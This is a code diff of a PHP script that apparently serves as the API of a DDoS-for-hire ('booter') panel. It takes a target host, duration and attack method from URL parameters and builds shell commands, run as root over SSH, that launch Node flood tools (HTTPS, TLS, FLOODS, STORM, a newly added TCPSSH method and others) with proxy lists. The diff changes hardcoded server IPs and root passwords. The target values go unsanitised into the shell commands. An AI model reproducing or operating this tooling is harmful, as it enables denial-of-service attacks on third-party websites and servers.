@@ -10,9 +10,9 @@ if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'], $_GET['ke
     $key = $_GET['key'];
 
     $username = 'root';
-    $ip = '167.172.74.180';
+    $ip = '143.198.202.89';
     $ports = '22';
-    $password = 'leomain@1';
+    $password = 'leo@123';
 
     $allowedKeys = ['starpez'];
 
@@ -21,44 +21,47 @@ if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'], $_GET['ke
     }
 
     switch ($method) {
+        case 'TCPSSH':
+            $command = "cd /root/ && screen -dm node tcpssh $host 22 root $time";
+            break;
         case 'HTTPS':
-            $command = "cd /var/www/html/ && screen -dm node HTTPS $host $time 8 2 proxy.txt";
+            $command = "cd /root/ && screen -dm node HTTPS $host $time 8 2 proxy.txt";
             break;
         case 'HTTP-X':
-            $command = "cd /var/www/html/ && screen -dm node HTTP-X $host $time 8 2 proxy.txt";
+            $command = "cd /root/ && screen -dm node HTTP-X $host $time 8 2 proxy.txt";
             break;
         case 'QUANTUM':
-            $command = "cd /var/www/html/ && screen -dm node QUANTUM $host $time 8 2 proxy.txt";
+            $command = "cd /root/ && screen -dm node QUANTUM $host $time 8 2 proxy.txt";
             break;
         case 'FLOODS':
-            $command = "cd /var/www/html/ && screen -dm node floods $host $time 8 2 proxy.txt flood";
+            $command = "cd /root/ && screen -dm node floods $host $time 8 2 proxy.txt flood";
             break;
         case 'TLS':
-            $command = "cd /var/www/html/ && screen -dm node TLS $host $time 8 2 proxy.txt";
+            $command = "cd /root/ && screen -dm node TLS $host $time 8 2 proxy.txt";
             break;
         case 'HOLD':
-            $command = "cd /var/www/html/ && screen -dm node HOLD $host $time 5 1 proxy.txt";
+            $command = "cd /root/ && pm2 start HOLD.js --name 'hold' -- $host $time 8 2 proxy.txt";
             break;
         case 'BROWSER':
-            $command = "cd /var/www/html/ && screen -dm node STATIC $host $time";
+            $command = "cd /root/ && screen -dm node STATIC $host $time";
             break;
         case 'STORM':
-            $command = "cd /var/www/html/ && screen -dm node Storm $host $time 8 2 proxy.txt";
+            $command = "cd /root/ && screen -dm node Storm $host $time 8 2 proxy.txt";
             break;
         case 'MIX':
-            $command = "cd /var/www/html/ && screen -dm node MIX $host $time 8 2";
+            $command = "cd /root/ && screen -dm node MIX $host $time 8 2";
             break;
         case 'RAW':
-            $command = "cd /var/www/html/ && screen -dm node HTTP-RAW $host $time";
+            $command = "cd /root/ && screen -dm node HTTP-RAW $host $time";
             break;
         case 'NINJA':
-            $command = "cd /var/www/html/ && screen -dm node ninja $host $time";
+            $command = "cd /root/ && screen -dm node ninja $host $time";
             break;
         case 'REFRESH':
-            $command = "cd /var/www/html/ && killall node";
+            $command = "cd /root/ && pm2 delete hold";
             break;
         case 'UPDATE':
-            $command = "cd /var/www/html/ && screen -dm node scrape.js && cd /var/www/html/ && apt update -y && apt upgarde -y";
+            $command = "cd /root/ && screen -dm node scrape.js && cd /root/ && apt update -y && apt upgarde -y";
             break;
         default:
             die("Unknown method");
